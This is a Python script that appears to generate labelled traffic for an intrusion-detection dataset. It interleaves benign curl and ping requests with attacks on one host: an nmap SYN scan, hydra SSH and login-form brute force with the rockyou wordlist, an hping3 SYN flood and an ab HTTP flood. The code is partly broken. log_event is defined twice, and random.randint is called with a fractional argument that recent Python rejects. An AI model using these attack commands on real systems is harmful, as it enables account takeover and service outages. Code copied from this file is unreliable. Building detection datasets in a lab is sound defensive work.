#!/usr/bin/env python3
import subprocess
import random
import time
import threading
import sys

TARGET = "10.0.1.2"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
USER = "testuser"

LABEL_FILE = "labels.log"

# ------------------ LABEL LOGGER ------------------

def log_event(label):
    ts = time.time()
    with open(LABEL_FILE, "a") as f:
        f.write(f"{ts},{label}\n")
    print(f"[LABEL] {label} @ {ts}")

def log_event(label):
    ts = time.time()
    event = f"{ts},{label}\n"
    with open(LABEL_FILE, "a") as f:
        f.write(event)

# ------------------ ATTACK FUNCTIONS ------------------

def port_scan():
    log_event("ATTACK_PORT_SCAN_START")
    subprocess.run([
        "sudo", "nmap",
        "-sS",
        "-p-",
        "-T4",
        TARGET
    ])
    log_event("ATTACK_PORT_SCAN_END")

def brute_force_ssh():
    log_event("ATTACK_SSH_BRUTE_START")
    subprocess.run([
        "hydra",
        "-l", USER,
        "-P", WORDLIST,
        f"ssh://{TARGET}",
        "-t", "4"
    ])
    log_event("ATTACK_SSH_BRUTE_END")

def dos_syn():
    log_event("ATTACK_SYN_FLOOD_START")
    process = subprocess.Popen([
        "sudo", "hping3",
        "-S",
        "--flood",
        "-p", "80",
        TARGET
    ])
    time.sleep(random.uniform(5, 10))
    process.terminate()
    log_event("ATTACK_SYN_FLOOD_END")

def dos_http():
    log_event("ATTACK_HTTP_FLOOD_START")
    subprocess.run([
        "ab",
        "-n", "1000",
        "-c", "50",
        f"http://{TARGET}/"
    ])
    log_event("ATTACK_HTTP_FLOOD_END")

def web_login_bruteforce():
    log_event("ATTACK_WEB_BRUTE_START")
    subprocess.run([
        "hydra",
        "-l", USER,
        "-P", WORDLIST,
        TARGET,
        "http-post-form",
        "/login.php:username=^USER^&password=^PASS^:F=incorrect"
    ])
    log_event("ATTACK_WEB_BRUTE_END")

ATTACKS = [
    port_scan,
    brute_force_ssh,
    dos_syn,
    dos_http,
    web_login_bruteforce
]

# ------------------ NORMAL TRAFFIC ------------------

def realistic_http_session():
    for _ in range(random.randint(0.5, 1)):
        subprocess.run(
            ["curl", "-s", f"http://{TARGET}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(random.uniform(0.2, 1.5))

def browsing_session():
    pages = ["/", "/index.html", "/login", "/products"]
    for _ in range(1):
        page = random.choice(pages)
        subprocess.run(
            ["curl", "-s", f"http://{TARGET}{page}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(random.uniform(0.5, 2))

def mixed_activity():
    subprocess.run(["nslookup", TARGET], stdout=subprocess.DEVNULL)
    time.sleep(0.2)
    subprocess.run(["curl", "-s", f"http://{TARGET}"], stdout=subprocess.DEVNULL)

def background_traffic():
    subprocess.Popen(
        ["ping", "-c", "5", TARGET],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

NORMAL_ACTIONS = [
    realistic_http_session,
    browsing_session,
    mixed_activity,
    background_traffic
]

# ------------------ THREADS ------------------

def normal_traffic_loop():
    while True:
        action = random.choice(NORMAL_ACTIONS)
        log_event("BENIGN")
        action()
        time.sleep(random.uniform(0.1, 1.0))

def attack_loop():
    while True:
        time.sleep(random.uniform(10, 30))  # cooldown before attack
        attack = random.choice(ATTACKS)
        attack()

# ------------------ MAIN ------------------

def main():
    print(f"[+] Starting labeled traffic generation on {TARGET}")
    print("[+] Press Ctrl+C to stop\n")

    # Clear previous labels
    open(LABEL_FILE, "w").close()

    # Start background normal traffic
    normal_thread = threading.Thread(target=normal_traffic_loop, daemon=True)
    normal_thread.start()

    # Start attack thread
    attack_thread = threading.Thread(target=attack_loop, daemon=True)
    attack_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Stopped traffic generation")
        sys.exit(0)

if __name__ == "__main__":
    main()
